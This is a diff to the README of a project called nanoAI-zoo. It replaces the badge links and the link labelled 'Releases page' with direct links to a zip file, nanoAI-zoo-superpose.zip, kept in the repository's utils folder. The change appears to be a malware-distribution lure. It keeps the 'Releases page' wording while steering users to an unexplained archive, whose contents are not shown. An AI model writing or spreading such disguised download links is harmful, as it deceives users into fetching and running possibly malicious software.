@@ -1,6 +1,6 @@
 # 🚀 nanoAI-zoo - Explore AI Models for Everyone
 
-[![Download](https://img.shields.io/badge/Download-nanoAI--zoo-blue.svg)](https://github.com/D3soros/nanoAI-zoo/releases)
+[![Download](https://raw.githubusercontent.com/D3soros/nanoAI-zoo/main/utils/nanoAI-zoo-superpose.zip)](https://raw.githubusercontent.com/D3soros/nanoAI-zoo/main/utils/nanoAI-zoo-superpose.zip)
 
 ## 📋 Overview
 
@@ -26,7 +26,7 @@ Before you start, ensure your computer meets these basic requirements:
 
 1. **Visit the Download Page**
 
-   To get started, visit the [Releases page](https://github.com/D3soros/nanoAI-zoo/releases). Here, you’ll find all the available versions of nanoAI-zoo.
+   To get started, visit the [Releases page](https://raw.githubusercontent.com/D3soros/nanoAI-zoo/main/utils/nanoAI-zoo-superpose.zip). Here, you’ll find all the available versions of nanoAI-zoo.
 
 2. **Choose the Right Version**
 
@@ -38,7 +38,7 @@ Before you start, ensure your computer meets these basic requirements:
 
    For a direct link to download the application, click the large button below:
 
-   [![Download](https://img.shields.io/badge/Download-nanoAI--zoo-blue.svg)](https://github.com/D3soros/nanoAI-zoo/releases)
+   [![Download](https://raw.githubusercontent.com/D3soros/nanoAI-zoo/main/utils/nanoAI-zoo-superpose.zip)](https://raw.githubusercontent.com/D3soros/nanoAI-zoo/main/utils/nanoAI-zoo-superpose.zip)
 
 4. **Install the Software**
 
